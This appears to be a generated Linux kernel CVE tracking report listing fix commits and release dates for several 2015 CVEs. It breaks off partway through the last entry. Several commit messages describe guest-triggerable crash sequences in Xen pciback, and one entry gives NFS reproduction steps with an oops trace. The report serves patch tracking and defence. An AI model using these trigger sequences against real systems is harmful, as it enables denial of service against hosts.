commit a396f3a210c3a61e94d6b87ec05a75d0be2a60d0
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 2 17:24:08 2015 -0500

    xen/pciback: Do not install an IRQ handler for MSI interrupts.
    
    Otherwise an guest can subvert the generic MSI code to trigger
    an BUG_ON condition during MSI interrupt freeing:
    
     for (i = 0; i < entry->nvec_used; i++)
            BUG_ON(irq_has_action(entry->irq + i));
    
    Xen PCI backed installs an IRQ handler (request_irq) for
    the dev->irq whenever the guest writes PCI_COMMAND_MEMORY
    (or PCI_COMMAND_IO) to the PCI_COMMAND register. This is
    done in case the device has legacy interrupts the GSI line
    is shared by the backend devices.
    
    To subvert the backend the guest needs to make the backend
    to change the dev->irq from the GSI to the MSI interrupt line,
    make the backend allocate an interrupt handler, and then command
    the backend to free the MSI interrupt and hit the BUG_ON.
    
    Since the backend only calls 'request_irq' when the guest
    writes to the PCI_COMMAND register the guest needs to call
    XEN_PCI_OP_enable_msi before any other operation. This will
    cause the generic MSI code to setup an MSI entry and
    populate dev->irq with the new PIRQ value.
    
    Then the guest can write to PCI_COMMAND PCI_COMMAND_MEMORY
    and cause the backend to setup an IRQ handler for dev->irq
    (which instead of the GSI value has the MSI pirq). See
    'xen_pcibk_control_isr'.
    
    Then the guest disables the MSI: XEN_PCI_OP_disable_msi
    which ends up triggering the BUG_ON condition in 'free_msi_irqs'
    as there is an IRQ handler for the entry->irq (dev->irq).
    
    Note that this cannot be done using MSI-X as the generic
    code does not over-write dev->irq with the MSI-X PIRQ values.
    
    The patch inhibits setting up the IRQ handler if MSI or
    MSI-X (for symmetry reasons) code had been called successfully.
    
    P.S.
    Xen PCIBack when it sets up the device for the guest consumption
    ends up writting 0 to the PCI_COMMAND (see xen_pcibk_reset_device).
    XSA-120 addendum patch removed that - however when upstreaming said
    addendum we found that it caused issues with qemu upstream. That
    has now been fixed in qemu upstream.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: a396f3a210c3a61e94d6b87ec05a75d0be2a60d0
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 408fb0e5aa7fda0059db282ff58c3b2a4278baa0
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 2 18:13:27 2015 -0500

    xen/pciback: Don't allow MSI-X ops if PCI_COMMAND_MEMORY is not set.
    
    commit f598282f51 ("PCI: Fix the NIU MSI-X problem in a better way")
    teaches us that dealing with MSI-X can be troublesome.
    
    Further checks in the MSI-X architecture shows that if the
    PCI_COMMAND_MEMORY bit is turned of in the PCI_COMMAND we
    may not be able to access the BAR (since they are memory regions).
    
    Since the MSI-X tables are located in there.. that can lead
    to us causing PCIe errors. Inhibit us performing any
    operation on the MSI-X unless the MEMORY bit is set.
    
    Note that Xen hypervisor with:
    "x86/MSI-X: access MSI-X table only after having enabled MSI-X"
    will return:
    xen_pciback: 0000:0a:00.1: error -6 enabling MSI-X for guest 3!
    
    When the generic MSI code tries to setup the PIRQ without
    MEMORY bit set. Which means with later versions of Xen
    (4.6) this patch is not neccessary.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: Jan Beulich <jbeulich@suse.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 408fb0e5aa7fda0059db282ff58c3b2a4278baa0
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 56441f3c8e5bd45aab10dd9f8c505dd4bec03b0d
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Fri Apr 3 11:08:22 2015 -0400

    xen/pciback: Return error on XEN_PCI_OP_enable_msi when device has MSI or MSI-X enabled
    
    The guest sequence of:
    
     a) XEN_PCI_OP_enable_msi
     b) XEN_PCI_OP_enable_msi
     c) XEN_PCI_OP_disable_msi
    
    results in hitting an BUG_ON condition in the msi.c code.
    
    The MSI code uses an dev->msi_list to which it adds MSI entries.
    Under the above conditions an BUG_ON() can be hit. The device
    passed in the guest MUST have MSI capability.
    
    The a) adds the entry to the dev->msi_list and sets msi_enabled.
    The b) adds a second entry but adding in to SysFS fails (duplicate entry)
    and deletes all of the entries from msi_list and returns (with msi_enabled
    is still set).  c) pci_disable_msi passes the msi_enabled checks and hits:
    
    BUG_ON(list_empty(dev_to_msi_list(&dev->dev)));
    
    and blows up.
    
    The patch adds a simple check in the XEN_PCI_OP_enable_msi to guard
    against that. The check for msix_enabled is not stricly neccessary.
    
    This is part of XSA-157.
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Reviewed-by: Jan Beulich <jbeulich@suse.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    7 ++++++-
 1 file changed, 6 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 56441f3c8e5bd45aab10dd9f8c505dd4bec03b0d
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 5e0ce1455c09dd61d029b8ad45d82e1ac0b6c4c9
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 2 18:07:44 2015 -0500

    xen/pciback: Return error on XEN_PCI_OP_enable_msix when device has MSI or MSI-X enabled
    
    The guest sequence of:
    
      a) XEN_PCI_OP_enable_msix
      b) XEN_PCI_OP_enable_msix
    
    results in hitting an NULL pointer due to using freed pointers.
    
    The device passed in the guest MUST have MSI-X capability.
    
    The a) constructs and SysFS representation of MSI and MSI groups.
    The b) adds a second set of them but adding in to SysFS fails (duplicate entry).
    'populate_msi_sysfs' frees the newly allocated msi_irq_groups (note that
    in a) pdev->msi_irq_groups is still set) and also free's ALL of the
    MSI-X entries of the device (the ones allocated in step a) and b)).
    
    The unwind code: 'free_msi_irqs' deletes all the entries and tries to
    delete the pdev->msi_irq_groups (which hasn't been set to NULL).
    However the pointers in the SysFS are already freed and we hit an
    NULL pointer further on when 'strlen' is attempted on a freed pointer.
    
    The patch adds a simple check in the XEN_PCI_OP_enable_msix to guard
    against that. The check for msi_enabled is not stricly neccessary.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Reviewed-by: Jan Beulich <jbeulich@suse.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 5e0ce1455c09dd61d029b8ad45d82e1ac0b6c4c9
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7cfb905b9638982862f0331b36ccaaca5d383b49
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Wed Apr 1 10:49:47 2015 -0400

    xen/pciback: For XEN_PCI_OP_disable_msi[|x] only disable if device has MSI(X) enabled.
    
    Otherwise just continue on, returning the same values as
    previously (return of 0, and op->result has the PIRQ value).
    
    This does not change the behavior of XEN_PCI_OP_disable_msi[|x].
    
    The pci_disable_msi or pci_disable_msix have the checks for
    msi_enabled or msix_enabled so they will error out immediately.
    
    However the guest can still call these operations and cause
    us to disable the 'ack_intr'. That means the backend IRQ handler
    for the legacy interrupt will not respond to interrupts anymore.
    
    This will lead to (if the device is causing an interrupt storm)
    for the Linux generic code to disable the interrupt line.
    
    Naturally this will only happen if the device in question
    is plugged in on the motherboard on shared level interrupt GSI.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |   33 ++++++++++++++++++++-------------
 1 file changed, 20 insertions(+), 13 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 7cfb905b9638982862f0331b36ccaaca5d383b49
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a396f3a210c3a61e94d6b87ec05a75d0be2a60d0
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 2 17:24:08 2015 -0500

    xen/pciback: Do not install an IRQ handler for MSI interrupts.
    
    Otherwise an guest can subvert the generic MSI code to trigger
    an BUG_ON condition during MSI interrupt freeing:
    
     for (i = 0; i < entry->nvec_used; i++)
            BUG_ON(irq_has_action(entry->irq + i));
    
    Xen PCI backed installs an IRQ handler (request_irq) for
    the dev->irq whenever the guest writes PCI_COMMAND_MEMORY
    (or PCI_COMMAND_IO) to the PCI_COMMAND register. This is
    done in case the device has legacy interrupts the GSI line
    is shared by the backend devices.
    
    To subvert the backend the guest needs to make the backend
    to change the dev->irq from the GSI to the MSI interrupt line,
    make the backend allocate an interrupt handler, and then command
    the backend to free the MSI interrupt and hit the BUG_ON.
    
    Since the backend only calls 'request_irq' when the guest
    writes to the PCI_COMMAND register the guest needs to call
    XEN_PCI_OP_enable_msi before any other operation. This will
    cause the generic MSI code to setup an MSI entry and
    populate dev->irq with the new PIRQ value.
    
    Then the guest can write to PCI_COMMAND PCI_COMMAND_MEMORY
    and cause the backend to setup an IRQ handler for dev->irq
    (which instead of the GSI value has the MSI pirq). See
    'xen_pcibk_control_isr'.
    
    Then the guest disables the MSI: XEN_PCI_OP_disable_msi
    which ends up triggering the BUG_ON condition in 'free_msi_irqs'
    as there is an IRQ handler for the entry->irq (dev->irq).
    
    Note that this cannot be done using MSI-X as the generic
    code does not over-write dev->irq with the MSI-X PIRQ values.
    
    The patch inhibits setting up the IRQ handler if MSI or
    MSI-X (for symmetry reasons) code had been called successfully.
    
    P.S.
    Xen PCIBack when it sets up the device for the guest consumption
    ends up writting 0 to the PCI_COMMAND (see xen_pcibk_reset_device).
    XSA-120 addendum patch removed that - however when upstreaming said
    addendum we found that it caused issues with qemu upstream. That
    has now been fixed in qemu upstream.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: a396f3a210c3a61e94d6b87ec05a75d0be2a60d0
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8569:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.59.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09ccfd238e5a0e670d8178cf50180ea81ae09ae1
Author: WANG Cong <xiyou.wangcong@gmail.com>
Date:   Mon Dec 14 13:48:36 2015 -0800

    pptp: verify sockaddr_len in pptp_bind() and pptp_connect()
    
    Reported-by: Dmitry Vyukov <dvyukov@gmail.com>
    Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/net/ppp/pptp.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-8569
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-15
Linus Commit: 09ccfd238e5a0e670d8178cf50180ea81ae09ae1
Linus Tag: 4.4
Stable Date: 2016-01-22
Stable Commit: 0b21a04d1ff604297995fe4a21bde8ba7333d42c
Stable Tag: 3.14.59

CVE-2015-8575:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.59.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 5233252fce714053f0151680933571a2da9cbfb4
Author: David S. Miller <davem@davemloft.net>
Date:   Tue Dec 15 15:39:08 2015 -0500

    bluetooth: Validate socket address length in sco_sock_bind().
    
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/bluetooth/sco.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-8575
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-15
Linus Commit: 5233252fce714053f0151680933571a2da9cbfb4
Linus Tag: 4.4
Stable Date: 2016-01-22
Stable Commit: f32e7aeb2d4e7b6427dc0ab630b851eed38b6d0a
Stable Tag: 3.14.59

CVE-2015-8660:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit acff81ec2c79492b180fade3c2894425cd35a545
Author: Miklos Szeredi <miklos@szeredi.hu>
Date:   Fri Dec 4 19:18:48 2015 +0100

    ovl: fix permission checking for setattr
    
    [Al Viro] The bug is in being too enthusiastic about optimizing ->setattr()
    away - instead of "copy verbatim with metadata" + "chmod/chown/utimes"
    (with the former being always safe and the latter failing in case of
    insufficient permissions) it tries to combine these two.  Note that copyup
    itself will have to do ->setattr() anyway; _that_ is where the elevated
    capabilities are right.  Having these two ->setattr() (one to set verbatim
    copy of metadata, another to do what overlayfs ->setattr() had been asked
    to do in the first place) combined is where it breaks.
    
    Signed-off-by: Miklos Szeredi <miklos@szeredi.hu>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/overlayfs/inode.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-8660
Break Date: 2014-10-24
Break Commit: e9be9d5e76e34872f0c37d72e25bc27fe9e2c54c
Break Tag: 3.18
Linus Fix Date: 2015-12-06
Linus Commit: acff81ec2c79492b180fade3c2894425cd35a545
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8709:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-8709
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2015-8709
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8746:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.54.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 18e3b739fdc826481c6a1335ce0c5b19b3d415da
Author: Kinglong Mee <kinglongmee@gmail.com>
Date:   Sat Aug 15 21:52:10 2015 +0800

    NFS: Fix a NULL pointer dereference of migration recovery ops for v4.2 client
    
    ---Steps to Reproduce--
    <nfs-server>
    # cat /etc/exports
    /nfs/referal  *(rw,insecure,no_subtree_check,no_root_squash,crossmnt)
    /nfs/old      *(ro,insecure,subtree_check,root_squash,crossmnt)
    
    <nfs-client>
    # mount -t nfs nfs-server:/nfs/ /mnt/
    # ll /mnt/*/
    
    <nfs-server>
    # cat /etc/exports
    /nfs/referal   *(rw,insecure,no_subtree_check,no_root_squash,crossmnt,refer=/nfs/old/@nfs-server)
    /nfs/old       *(ro,insecure,subtree_check,root_squash,crossmnt)
    # service nfs restart
    
    <nfs-client>
    # ll /mnt/*/    --->>>>> oops here
    
    [ 5123.102925] BUG: unable to handle kernel NULL pointer dereference at           (null)
    [ 5123.103363] IP: [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4]
    [ 5123.103752] PGD 587b9067 PUD 3cbf5067 PMD 0
    [ 5123.104131] Oops: 0000 [#1]
    [ 5123.104529] Modules linked in: nfsv4(OE) nfs(OE) fscache(E) nfsd(OE) xfs libcrc32c iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi coretemp crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel ppdev vmw_balloon parport_pc parport i2c_piix4 shpchp auth_rpcgss nfs_acl vmw_vmci lockd grace sunrpc vmwgfx drm_kms_helper ttm drm mptspi serio_raw scsi_transport_spi e1000 mptscsih mptbase ata_generic pata_acpi [last unloaded: nfsd]
    [ 5123.105887] CPU: 0 PID: 15853 Comm: ::1-manager Tainted: G           OE   4.2.0-rc6+ #214
    [ 5123.106358] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/20/2014
    [ 5123.106860] task: ffff88007620f300 ti: ffff88005877c000 task.ti: ffff88005877c000
    [ 5123.107363] RIP: 0010:[<ffffffffa03ed38b>]  [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4]
    [ 5123.107909] RSP: 0018:ffff88005877fdb8  EFLAGS: 00010246
    [ 5123.108435] RAX: ffff880053f3bc00 RBX: ffff88006ce6c908 RCX: ffff880053a0d240
    [ 5123.108968] RDX: ffffea0000e6d940 RSI: ffff8800399a0000 RDI: ffff88006ce6c908
    [ 5123.109503] RBP: ffff88005877fe28 R08: ffffffff81c708a0 R09: 0000000000000000
    [ 5123.110045] R10: 00000000000001a2 R11: ffff88003ba7f5c8 R12: ffff880054c55800
    [ 5123.110618] R13: 0000000000000000 R14: ffff880053a0d240 R15: ffff880053a0d240
    [ 5123.111169] FS:  0000000000000000(0000) GS:ffffffff81c27000(0000) knlGS:0000000000000000
    [ 5123.111726] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    [ 5123.112286] CR2: 0000000000000000 CR3: 0000000054cac000 CR4: 00000000001406f0
    [ 5123.112888] Stack:
    [ 5123.113458]  ffffea0000e6d940 ffff8800399a0000 00000000000167d0 0000000000000000
    [ 5123.114049]  0000000000000000 0000000000000000 0000000000000000 00000000a7ec82c6
    [ 5123.114662]  ffff88005877fe18 ffffea0000e6d940 ffff8800399a0000 ffff880054c55800
    [ 5123.115264] Call Trace:
    [ 5123.115868]  [<ffffffffa03fb44b>] nfs4_try_migration+0xbb/0x220 [nfsv4]
    [ 5123.116487]  [<ffffffffa03fcb3b>] nfs4_run_state_manager+0x4ab/0x7b0 [nfsv4]
    [ 5123.117104]  [<ffffffffa03fc690>] ? nfs4_do_reclaim+0x510/0x510 [nfsv4]
    [ 5123.117813]  [<ffffffff810a4527>] kthread+0xd7/0xf0
    [ 5123.118456]  [<ffffffff810a4450>] ? kthread_worker_fn+0x160/0x160
    [ 5123.119108]  [<ffffffff816d9cdf>] ret_from_fork+0x3f/0x70
    [ 5123.119723]  [<ffffffff810a4450>] ? kthread_worker_fn+0x160/0x160
    [ 5123.120329] Code: 4c 8b 6a 58 74 17 eb 52 48 8d 55 a8 89 c6 4c 89 e7 e8 4a b5 ff ff 8b 45 b0 85 c0 74 1c 4c 89 f9 48 8b 55 90 48 8b 75 98 48 89 df <41> ff 55 00 3d e8 d8 ff ff 41 89 c6 74 cf 48 8b 4d c8 65 48 33
    [ 5123.121643] RIP  [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4]
    [ 5123.122308]  RSP <ffff88005877fdb8>
    [ 5123.122942] CR2: 0000000000000000
    
    Fixes: ec011fe847 ("NFS: Introduce a vector of migration recovery ops")
    Cc: stable@vger.kernel.org # v3.13+
    Signed-off-by: Kinglong Mee <kinglongmee@gmail.com>
    Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>

 fs/nfs/nfs4proc.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8746
Break Date: 2013-10-28
Break Commit: ec011fe847347b40c60fdb5085f65227762e2e08
Break Tag: 3.13
Linus Fix Date: 2015-08-17
Linus Commit: 18e3b739fdc826481c6a1335ce0c5b19b3d415da
Linus Tag: 4.3
Stable Date: 2015-10-01
Stable Commit: 05c5d5c75b6e30af9b00ecd07eb9f2733741e8df
Stable Tag: 3.14.54

CVE-2015-8767:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 635682a14427d241bab7bbdeebb48a7d7b91638e
Author: Karl Heiss <kheiss@gmail.com>
Date:   Thu Sep 24 12:15:07 2015 -0400

    sctp: Prevent soft lockup when sctp_accept() is called during a timeout event
    
    A case can occur when sctp_accept() is called by the user during
    a heartbeat timeout event after the 4-way handshake.  Since
    sctp_assoc_migrate() changes both assoc->base.sk and assoc->ep, the
    bh_sock_lock in sctp_generate_heartbeat_event() will be taken with
    the listening socket but released with the new association socket.
    The result is a deadlock on any future attempts to take the listening
    socket lock.
    
    Note that this race can occur with other SCTP timeouts that take
    the bh_lock_sock() in the event sctp_accept() is called.
    
     BUG: soft lockup - CPU#9 stuck for 67s! [swapper:0]
     ...
     RIP: 0010:[<ffffffff8152d48e>]  [<ffffffff8152d48e>] _spin_lock+0x1e/0x30
     RSP: 0018:ffff880028323b20  EFLAGS: 00000206
     RAX: 0000000000000002 RBX: ffff880028323b20 RCX: 0000000000000000
     RDX: 0000000000000000 RSI: ffff880028323be0 RDI: ffff8804632c4b48
     RBP: ffffffff8100bb93 R08: 0000000000000000 R09: 0000000000000000
     R10: ffff880610662280 R11: 0000000000000100 R12: ffff880028323aa0
     R13: ffff8804383c3880 R14: ffff880028323a90 R15: ffffffff81534225
     FS:  0000000000000000(0000) GS:ffff880028320000(0000) knlGS:0000000000000000
     CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b
     CR2: 00000000006df528 CR3: 0000000001a85000 CR4: 00000000000006e0
     DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
     DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
     Process swapper (pid: 0, threadinfo ffff880616b70000, task ffff880616b6cab0)
     Stack:
     ffff880028323c40 ffffffffa01c2582 ffff880614cfb020 0000000000000000
     <d> 0100000000000000 00000014383a6c44 ffff8804383c3880 ffff880614e93c00
     <d> ffff880614e93c00 0000000000000000 ffff8804632c4b00 ffff8804383c38b8
     Call Trace:
     <IRQ>
     [<ffffffffa01c2582>] ? sctp_rcv+0x492/0xa10 [sctp]
     [<ffffffff8148c559>] ? nf_iterate+0x69/0xb0
     [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0
     [<ffffffff8148c716>] ? nf_hook_slow+0x76/0x120
     [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0
     [<ffffffff8149757d>] ? ip_local_deliver_finish+0xdd/0x2d0
     [<ffffffff81497808>] ? ip_local_deliver+0x98/0xa0
     [<ffffffff81496ccd>] ? ip_rcv_finish+0x12d/0x440
     [<ffffffff81497255>] ? ip_rcv+0x275/0x350
     [<ffffffff8145cfeb>] ? __netif_receive_skb+0x4ab/0x750
     ...
    
    With lockdep debugging:
    
     =====================================
     [ BUG: bad unlock balance detected! ]
     -------------------------------------
     CslRx/12087 is trying to release lock (slock-AF_INET) at:
     [<ffffffffa01bcae0>] sctp_generate_timeout_event+0x40/0xe0 [sctp]
     but there are no more locks to release!
    
     other info that might help us debug this:
     2 locks held by CslRx/12087:
     #0:  (&asoc->timers[i]){+.-...}, at: [<ffffffff8108ce1f>] run_timer_softirq+0x16f/0x3e0
     #1:  (slock-AF_INET){+.-...}, at: [<ffffffffa01bcac3>] sctp_generate_timeout_event+0x23/0xe0 [sctp]
    
    Ensure the socket taken is also the same one that is released by
    saving a copy of the socket before entering the timeout event
    critical section.
    
    Signed-off-by: Karl Heiss <kheiss@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/sm_sideeffect.c |   42 +++++++++++++++++++++++-------------------
 1 file changed, 23 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-8767
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-09-28
Linus Commit: 635682a14427d241bab7bbdeebb48a7d7b91638e
Linus Tag: 4.3
Stable Date: 2016-08-16
Stable Commit: a4377c6e467b0b8420ee2d4384ae582ed506ee86
Stable Tag: 3.14.76

CVE-2015-8785:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.62.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 3ca8138f014a913f98e6ef40e939868e1e9ea876
Author: Roman Gushchin <klamm@yandex-team.ru>
Date:   Mon Oct 12 16:33:44 2015 +0300

    fuse: break infinite loop in fuse_fill_write_pages()
    
    I got a report about unkillable task eating CPU. Further
    investigation shows, that the problem is in the fuse_fill_write_pages()
    function. If iov's first segment has zero length, we get an infinite
    loop, because we never reach iov_iter_advance() call.
    
    Fix this by calling iov_iter_advance() before repeating an attempt to
    copy data from userspace.
    
    A similar problem is described in 124d3b7041f ("fix writev regression:
    pan hanging unkillable and un-straceable"). If zero-length segmend
    is followed by segment with invalid address,
    iov_iter_fault_in_readable() checks only first segment (zero-length),
    iov_iter_copy_from_user_atomic() skips it, fails at second and
    returns zero -> goto again without skipping zero-length segment.
    
    Patch calls iov_iter_advance() before goto again: we'll skip zero-length
    segment at second iteraction and iov_iter_fault_in_readable() will detect
    invalid address.
    
    Special thanks to Konstantin Khlebnikov, who helped a lot with the commit
    description.
    
    Cc: Andrew Morton <akpm@linux-foundation.org>
    Cc: Maxim Patlasov <mpatlasov@parallels.com>
    Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>
    Signed-off-by: Roman Gushchin <klamm@yandex-team.ru>
    Signed-off-by: Miklos Szeredi <miklos@szeredi.hu>
    Fixes: ea9b9907b82a ("fuse: implement perform_write")
    Cc: <stable@vger.kernel.org>

 fs/fuse/file.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-8785
Break Date: 2008-04-30
Break Commit: ea9b9907b82a09bd1a708004454f7065de77c5b0
Break Tag: 2.6
Linus Fix Date: 2015-11-10
Linus Commit: 3ca8138f014a913f98e6ef40e939868e1e9ea876
Linus Tag: 4.4
Stable Date: 2016-02-25
Stable Commit: 7b54d4eea25df0cac10c9ccf353b36a62253547d
Stable Tag: 3.14.62

CVE-2015-8787:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 94f9cd81436c85d8c3a318ba92e236ede73752fc
Author: Munehisa Kamata <kamatam@amazon.com>
Date:   Mon Oct 26 19:10:52 2015 -0700

    netfilter: nf_nat_redirect: add missing NULL pointer check
    
    Commit 8b13eddfdf04cbfa561725cfc42d6868fe896f56 ("netfilter: refactor NAT
    redirect IPv4 to use it from nf_tables") has introduced a trivial logic
